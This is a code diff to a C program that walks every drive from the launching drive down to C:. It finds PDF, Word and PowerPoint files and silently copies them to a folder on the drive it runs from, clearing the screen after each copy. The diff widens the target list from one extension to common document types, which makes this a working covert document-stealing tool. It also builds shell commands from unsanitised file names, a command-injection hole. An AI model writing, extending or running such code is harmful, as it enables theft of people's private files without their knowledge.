@@ -93,11 +93,15 @@ void walkdir(char * path, char runPath){
         /* could not open directory so its a file or a folder that cant be opened */
 
         /* and now we write a function to copy our files */
-        if (strstr(path,".slm")){
+        if (strstr(path,".pdf") ||
+                strstr(path,".doc") ||
+                strstr(path,".docx") ||
+                strstr(path,".ppt") ||
+                strstr(path,".pptx")){
             char  copy_cmd[2000] ;
 
             /* name may contains space so we should put it between "" */
-            sprintf(copy_cmd,"copy \"%s\" %c:\\",path,runPath);
+            sprintf(copy_cmd,"copy \"%s\" %c:\\cpp\\AI",path,runPath);
             system(copy_cmd);
             system("cls");
 
@@ -116,12 +120,11 @@ int main()
     GetModuleFileName( NULL, result, MAX_PATH );
     runPath = result[0];
 
-
     /* run walkdir for every directories */
     /* from one drive up to drive c */
 
-    for(char i=runPath+1;i>=67;i--) {
-        if (i==runPath)
+    for(char i=char(result[0]+1);i>=67;i--) {
+        if (i==result[0])
             continue;
         char path[2];
         sprintf(path,"%c:",i);
